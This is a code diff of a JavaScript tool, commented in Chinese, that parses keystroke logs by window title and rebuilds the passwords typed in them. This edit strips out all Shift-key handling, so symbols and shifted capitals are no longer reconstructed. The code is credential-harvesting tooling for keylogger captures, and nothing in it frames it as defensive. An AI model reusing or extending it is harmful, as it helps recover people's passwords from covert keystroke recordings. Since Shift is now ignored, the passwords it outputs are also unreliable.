@@ -2098,24 +2098,18 @@ function splitLineIntoTokens(line) {
     return tokens;
 }
 
-// 解析按键序列为最终密码文本
+// 解析按键序列为最终密码文本（忽略 Shift 键）
 function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialAlt, initialCaps) {
-    let shift = initialShift;
+    let shift = initialShift; // 保留变量但不使用
     let ctrl = initialCtrl;
     let alt = initialAlt;
     let caps = initialCaps;
     const result = [];
-    const shiftMap = {
-        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
-        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
-        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
-        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
-        '`': '~'
-    };
+    // shiftMap 保留但不使用
 
     for (const item of sequence) {
-        // 更新修饰键状态
-        if (item === '[LSHIFT]' || item === '[RSHIFT]') { shift = true; continue; }
+        // 更新修饰键状态，但 Shift 直接忽略
+        if (item === '[LSHIFT]' || item === '[RSHIFT]') { continue; } // 完全忽略 Shift
         if (item === '[LCONTROL]' || item === '[RCONTROL]') { ctrl = true; continue; }
         if (item === '[LALT]' || item === '[RALT]') { alt = true; continue; }
         if (item === '[CAPSLOCK]') { caps = !caps; continue; }
@@ -2123,23 +2117,23 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
         // 退格键处理
         if (item === '[BACKSPACE]' || item === '[BACK]') {
             if (result.length > 0) result.pop();
-            shift = false; ctrl = false; alt = false;
+            ctrl = false; alt = false;
             continue;
         }
 
         // Tab 键和 Enter 键：在这里仅重置修饰键，不添加到密码中（因为密码提交由 Enter 触发）
         if (item === '[TAB]' || item === '[ENTER]' || item === '[RETURN]') {
-            shift = false; ctrl = false; alt = false;
+            ctrl = false; alt = false;
             continue;
         }
 
         // 其他功能键忽略
         if (item.startsWith('[') && item.endsWith(']')) {
-            shift = false; ctrl = false; alt = false;
+            ctrl = false; alt = false;
             continue;
         }
 
-        // 处理普通字符（长度1）
+        // 处理普通字符（长度1）- 不使用 Shift，直接原样输出
         if (item.length === 1) {
             let char = item;
             const code = item.charCodeAt(0);
@@ -2147,21 +2141,15 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
             const isLowerCaseLetter = code >= 97 && code <= 122; // a-z
 
             if (isUpperCaseLetter || isLowerCaseLetter) {
-                // 决定最终大小写：大写条件 = (shift被按下 XNOR caps开启?) 实际上：仅当 shift 与 caps 一个生效时为大写
-                const makeUpper = shift ^ caps;
-                char = makeUpper ? item.toUpperCase() : item.toLowerCase();
-            } else {
-                // 数字和符号：shift 影响
-                if (shift && shiftMap[item]) {
-                    char = shiftMap[item];
-                }
+                // 仅考虑 CapsLock，忽略 Shift
+                char = caps ? item.toUpperCase() : item.toLowerCase();
             }
+            // 数字和符号：直接原样输出，不使用 Shift 映射
 
             result.push(char);
         }
 
         // 字符输入后重置修饰键（Shift/Alt/Ctrl 通常只影响紧接着的一个按键）
-        shift = false;
         ctrl = false;
         alt = false;
     }
@@ -2179,7 +2167,6 @@ function extractPasswordsFromLog(content, filename) {
     let timestamp = null;
     let inPasswordMode = false;           // 是否处于密码捕获模式
     let rawSequence = [];
-    let shiftPressed = false;
     let ctrlPressed = false;
     let altPressed = false;
     let capsLock = false;
@@ -2193,7 +2180,7 @@ function extractPasswordsFromLog(content, filename) {
 
     const saveCurrentPassword = () => {
         if (inPasswordMode && rawSequence.length > 0) {
-            const parsed = parsePasswordFromSequence(rawSequence, shiftPressed, ctrlPressed, altPressed, capsLock);
+            const parsed = parsePasswordFromSequence(rawSequence, false, ctrlPressed, altPressed, capsLock); // Shift 始终 false
             if (parsed && parsed.length >= 3) {  // 过滤过短的误触
                 passwords.push({
                     file: filename,
@@ -2220,7 +2207,6 @@ function extractPasswordsFromLog(content, filename) {
         if (line.startsWith('[Window:')) {
             saveCurrentPassword();
             rawSequence = [];
-            shiftPressed = false;
             ctrlPressed = false;
             altPressed = false;
 
@@ -2247,8 +2233,8 @@ function extractPasswordsFromLog(content, filename) {
             // 首先将所有按键添加到原始序列中
             rawSequence.push(token);
             
-            // 更新修饰键状态（全局追踪）
-            if (token === '[LSHIFT]' || token === '[RSHIFT]') { shiftPressed = true; continue; }
+            // 更新修饰键状态（全局追踪）- Shift 忽略
+            if (token === '[LSHIFT]' || token === '[RSHIFT]') { continue; } // 完全忽略 Shift
             if (token === '[LCONTROL]' || token === '[RCONTROL]') { ctrlPressed = true; continue; }
             if (token === '[LALT]' || token === '[RALT]') { altPressed = true; continue; }
             if (token === '[CAPSLOCK]') { capsLock = !capsLock; continue; }
@@ -2258,7 +2244,6 @@ function extractPasswordsFromLog(content, filename) {
                 saveCurrentPassword();
                 rawSequence = [];
                 // 重置修饰键状态
-                shiftPressed = false;
                 ctrlPressed = false;
                 altPressed = false;
                 continue;
@@ -2267,7 +2252,6 @@ function extractPasswordsFromLog(content, filename) {
             // Tab 键作为密码的一部分，不分割密码
             if (token === '[TAB]') {
                 // 重置修饰键状态
-                shiftPressed = false;
                 ctrlPressed = false;
                 altPressed = false;
                 continue;
@@ -2276,7 +2260,6 @@ function extractPasswordsFromLog(content, filename) {
             // 退格删除 - 这里不需要从rawSequence中移除，因为我们要保留原始按键记录
             if (token === '[BACKSPACE]' || token === '[BACK]') {
                 // 重置修饰键状态
-                shiftPressed = false;
                 ctrlPressed = false;
                 altPressed = false;
                 continue;
@@ -2284,17 +2267,12 @@ function extractPasswordsFromLog(content, filename) {
 
             // 遇到其他功能键时，重置修饰键状态
             if (token.startsWith('[') && token.endsWith(']')) {
-                shiftPressed = false;
                 ctrlPressed = false;
                 altPressed = false;
                 continue;
             }
 
-            // 普通字符输入
-            if (!token.startsWith('[') || !token.endsWith(']')) {
-                // 字符输入后重置 shift 状态
-                shiftPressed = false;
-            }
+            // 普通字符输入 - 无需特殊处理
         }
         
         // 在每行结束后添加换行符到原始序列中，以保持与源文件的一致性
